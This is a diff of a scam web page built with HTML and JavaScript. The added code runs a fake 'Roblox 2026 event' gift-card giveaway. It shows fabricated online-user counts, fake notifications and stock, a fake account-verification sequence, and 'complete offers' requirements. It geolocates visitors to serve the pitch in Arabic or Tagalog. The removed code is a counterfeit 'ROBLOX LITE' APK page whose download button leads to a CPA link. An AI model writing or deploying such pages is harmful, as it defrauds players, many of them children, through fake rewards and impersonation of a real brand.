+        const nextTime = Math.random() * (15000 - 5000) + 5000;
+        setTimeout(triggerNotif, nextTime);
+    }
+
+    // Function to update online count
+    function updateOnlineCount() {
+        const countElement = document.getElementById('online-count');
+        if(!countElement) return;
+
+        let count = Math.floor(Math.random() * (5000 - 2000 + 1)) + 2000;
+        countElement.innerText = count.toLocaleString() + " Online";
+        
+        setInterval(() => {
+            const change = Math.floor(Math.random() * 100) - 50; 
+            count += change;
+            if(count < 2000) count = 2000;
+            if(count > 5000) count = 5000;
+            countElement.innerText = count.toLocaleString() + " Online";
+        }, 5000);
+    }
+
+    function showModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+    
+    function resetEverything() { 
+        sessionStorage.clear();
+        location.reload(); 
+    }
+// دالة توحيد اللغة العربية وتخصيص الفلبين
+    async function checkCountryAndTranslate() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            const country = data.country_code;
+
+            // 1. قائمة الدول العربية (لغة موحدة للجميع)
+            const arabCountries = [
+                'SA', 'AE', 'KW', 'QA', 'BH', 'OM', 'EG', 'IQ', 'JO', 
+                'LB', 'PS', 'YE', 'SY', 'SD', 'LY', 'TN', 'DZ', 'MA', 
+                'MR', 'SO', 'DJ', 'KM'
+            ];
+
+            // إذا كان الزائر من أي دولة عربية -> حول للعربية الفصحى
+            if (arabCountries.includes(country)) {
+                applyUnifiedArabic();
+                document.body.style.direction = "rtl";
+                document.body.style.fontFamily = "Tahoma, 'Segoe UI', sans-serif";
+            } 
+            // 2. إذا كان الزائر من الفلبين -> حول للتاغالوغ
+            else if (country === 'PH') {
+                 applyTagalog();
+            }
+            // 3. غير ذلك -> يبقى إنجليزي (اللغة الأصلية للموقع)
+
+        } catch (error) {
+            console.log('Location check failed, keeping English.');
+        }
+    }
+
+    // دالة العربية الفصحى (مفهومة للجميع)
+    function applyUnifiedArabic() {
+        // العنوان والشرح
+        document.querySelector('h2').innerHTML = 'حدث روبلوكس <span class="text-yellow-500">2026</span>';
+        
+        const descText = document.querySelector('.mt-4.px-2 p.text-\\[10px\\]');
+        if(descText) {
+            descText.innerHTML = '<span class="text-green-500 font-bold">طريقة الاستلام:</span> أدخل اسم المستخدم، اختر العرض المناسب، وأكمل التحقق للحصول على الكود.';
+        }
+
+        const noteText = document.querySelector('.mt-4.px-2 p.text-\\[9px\\]');
+        if(noteText) {
+            noteText.innerHTML = 'ملاحظة: البطاقات العادية تتطلب 1-2 مهمة. <span class="text-blue-400 font-bold">بطاقة الـ 50$ المحدودة</span> متاحة لفترة قصيرة (تتطلب 3 مهام).';
+        }
+        
+        // الحقول والأخطاء
+        document.querySelector('label').innerText = 'اسم مستخدم روبلوكس';
+        document.getElementById('username-input').placeholder = 'أكتب اسم المستخدم هنا...';
+        document.getElementById('lang-error').innerText = 'تنبيه: الرجاء استخدام حروف إنجليزية فقط!';
+
+        // تفاصيل البطاقات
+        const requirements = document.querySelectorAll('.card-unit p.text-\\[8px\\]');
+        requirements.forEach(req => {
+            if(req.innerText.includes('Complete 1 Offer')) req.innerText = 'المطلوب: إكمال عرض واحد';
+            if(req.innerText.includes('Complete 2 Offers')) req.innerText = 'المطلوب: إكمال عرضين';
+            if(req.innerText.includes('Complete 3 Offers')) req.innerText = 'المطلوب: إكمال 3 عروض';
+            if(req.innerText.includes('Special Event')) req.innerHTML = 'حدث خاص: 3 عروض فقط بدلاً من 4';
+        });
+        
+        // الأزرار والنصوص الصغيرة
+        document.querySelectorAll('.text-green-500.tracking-wider').forEach(el => el.innerText = "مجاني");
+        document.querySelectorAll('.bg-yellow-500\\/10').forEach(el => {
+             let stockNum = el.querySelector('.stock-val').innerText;
+             el.innerHTML = `المخزون: <span class="stock-val" data-min="${el.querySelector('.stock-val').dataset.min}" data-max="${el.querySelector('.stock-val').dataset.max}">${stockNum}</span>`;
+        });
+
+        // المرحلة الثانية (التحميل)
+        const step1 = document.querySelector('#step1-icon + p');
+        if(step1) step1.innerText = "تم العثور على الحساب";
+        
+        const step2 = document.getElementById('step2-text');
+        if(step2) step2.innerText = "جارِ الاتصال بالسيرفر...";
+        
+        const loadingText = document.getElementById('loading-text');
+        if(loadingText) loadingText.innerText = "جارِ المعالجة...";
+
+        const finalBtn = document.getElementById('final-btn');
+        if(finalBtn) finalBtn.innerText = "إتمام التحويل يدوياً";
+        
+        const mainCta = document.getElementById('main-cta');
+        if(mainCta) mainCta.innerText = "احصل عليها الآن";
+    }
+
+    // دالة الفلبين (Tagalog)
+    function applyTagalog() {
+        // العناوين
+        const descText = document.querySelector('.mt-4.px-2 p.text-\\[10px\\]');
+        if(descText) {
+            descText.innerHTML = '<span class="text-green-500 font-bold">Paano Kuhanin:</span> Ilagay ang Username, pumili ng Bundle, at tapusin ang verification.';
+        }
+
+        const noteText = document.querySelector('.mt-4.px-2 p.text-\\[9px\\]');
+        if(noteText) {
+            noteText.innerHTML = 'Paalala: Ang regular cards ay kailangan ng 1-2 tasks. Ang <span class="text-blue-400 font-bold">$50 Limited Edition</span> ay available sandali lang (3 tasks).';
+        }
+
+        // البطاقات
+        const requirements = document.querySelectorAll('.card-unit p.text-\\[8px\\]');
+        requirements.forEach(req => {
+            if(req.innerText.includes('Complete 1 Offer')) req.innerText = 'Kailangan: Tapusin ang 1 Offer';
+            if(req.innerText.includes('Complete 2 Offers')) req.innerText = 'Kailangan: Tapusin ang 2 Offers';
+            if(req.innerText.includes('Complete 3 Offers')) req.innerText = 'Kailangan: Tapusin ang 3 Offers';
+            if(req.innerText.includes('Special Event')) req.innerHTML = 'Espesyal na Event: 3 Offers lang';
+        });
+
+        // المرحلة الثانية
+        const step1 = document.querySelector('#step1-icon + p');
+        if(step1) step1.innerText = "Account Found (Nahanap na)";
+        
+        const loadingText = document.getElementById('loading-text');
+        if(loadingText) loadingText.innerText = "Pinoproseso...";
+
+        const finalBtn = document.getElementById('final-btn');
+        if(finalBtn) finalBtn.innerText = "KUNIN ANG MANUAL TRANSFER";
+        
+        const mainCta = document.getElementById('main-cta');
+        if(mainCta) mainCta.innerText = "Kuhanin Ngayon";
+    }
+
+    // تشغيل الكود
+    init();
 </script>
-  
-<body>
-
-<style type="text/css">
-@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
-
-body {
-  font-family: 'Poppins', sans-serif;
-  background: #fff;
-  display: flex;
-  justify-content: center;
-}
-
-.cr .cover img {width:100%;}
-.cr .logo img {width:110px;height:110px;border:1px solid #ddd;margin-top:-30px;border-radius:5px;}
-.cr .logo {display:flex;}
-.cr .logo .info {padding:15px 0 0 15px;}
-.det {display:flex;margin:20px 0;}
-.det .item {width:100%;text-align:center;font-size:.9rem;}
-.btn-down {all:unset;width:100%;background:#000;border:none;color:#fff;padding:10px 0;border-radius:34px;margin:10px 0 20px 0;text-align:center;}
-.bad {display:flex;overflow:scroll;color:#666;}
-.bad div {margin-right:10px;padding:4px 8px;border:1.3px solid #ccc;font-size:.8rem;white-space:nowrap;border-radius:5px;}
-.v9 {background-image:url("https://www.incredibox.com/img/down-v9-artwork.jpg");padding:40px 0;background-position:center;background-size:cover;}
-
-p {font-size:.85rem;color:#777;}
-h1 {font-size:1.6rem;}
-h2 {font-size:1.4rem;}
-h3 {font-size:1.25rem;}
-h4 {color:#eee;font-size:1rem;margin-bottom:12px;}
-
-
-footer {background:#252525;padding:30px 0;margin-top:40px;color:#a1a1a1;font-size:.9rem;}
-</style>
-<br><br>
-
-
-<div class="cr" >
-	<div class="cover" ><img src="https://i.ibb.co/RT62T2cD/unnamed-3.jpg" ></div>
-	<div class="container-md" >
-		<div class="logo" >
-			<img src="https://modfyp.com/uploads/2025/10/roblox-lite-apk.webp" >
-			<div class="info" >
-				<h1>ROBLOX LITE</h1>
-				<small>Roblox Corporation</small>
-			</div>
-		</div>
-		<div class="det" >
-			<div class="item" >
-				<div class="icon" >4.7 <i class="bi bi-star" ></i></div>
-				<div>5M reviews</div>
-			</div>
-			<div class="item" >
-				<div class="icon" ><i class="bi bi-download" ></i></div>
-				<div>120MB</div>
-			</div>
-			<div class="item" >
-				<div class="icon" >500K</div>
-				<div>Downloads</div>
-			</div>
-		</div>
-		<div>
-		
-		
-				<!-- CPA (Bdl Dik Oncklick B code Dyalk) -->
-			<button  class="btn-down"   onclick="location.href='https://confirmapp.store/cl/i/1xx98x';".fadeIn()">Download</button>
-		
-		
-	
-		</div>
-		<h2>About this game</h2>
-		<p>Roblox lite is an immersive online universe where you can create, share, and play games designed by millions of players worldwide. Explore countless worlds, take part in unique adventures, and enjoy endless creativity — all from your Android device. Build your own experiences or join others and discover why Roblox is one of the most popular platforms for gamers of all ages.</p>
-		<div class="bad" >
-			<div>#1 top games 2024</div> 
-			<div>#lite</div>
-			<div>#roblox</div>
-		</div>
-		<br> 
-		
-	</div>
-
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvoDis2o3zumGlO5ZkWgkKxueZXhxRECAvSVKmEP47saWaWduNyj-sKRs&s=10" class="w-100" >
-		
-	<div class="container-md" >
-<br>
-		<h2>So ROBLOX LITE</h2>
-		<h3> PLAY WITH FRIENDS AND ONLINE</h3>
-		<p>Gamers who are familiar and experienced with creative sandbox experiences will enjoy Roblox lite the most. It allows players to explore, build, and share unique worlds created by others — all while enjoying endless gameplay possibilities.</p>
-		
-		<h3>REDESIGNED SET PIECES</h3>
-		<p>Gamers who are familiar and experienced with creative sandbox experiences will enjoy Roblox lite the most. It allows players to explore, build, and share unique worlds created by others — all while enjoying endless gameplay possibilities.</p>
-		
-	</div>
-	
-	<footer>
-		<div class="container-md" >
-			<h4>ROBLOX !</h4>
-			<div class="row" >
-				<div class="col-6" >
-					<div class="mb-2" >About game</div>
-					<div class="mb-2" >roblox mobile</div>
-					<div class="mb-2" >Free download</div>
-				</div>
-				<div class="col-6" >
-					<div class="mb-2" >Help</div>
-					<div class="mb-2" >News</div>
-				</div>
-			</div>
-			<hr>
-			<center>&copy; 2025 Roblox Corporation EC Inc.</center>
-			</div>
-	</footer>
-	
-</div></body></html>
+<!-- Cloudflare Pages Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "fef0ae45823446be99f02e2dc0ddc5d4"}'></script><!-- Cloudflare Pages Analytics --><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8def5c3d0b6743b4ab2500e86c5ce40c","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
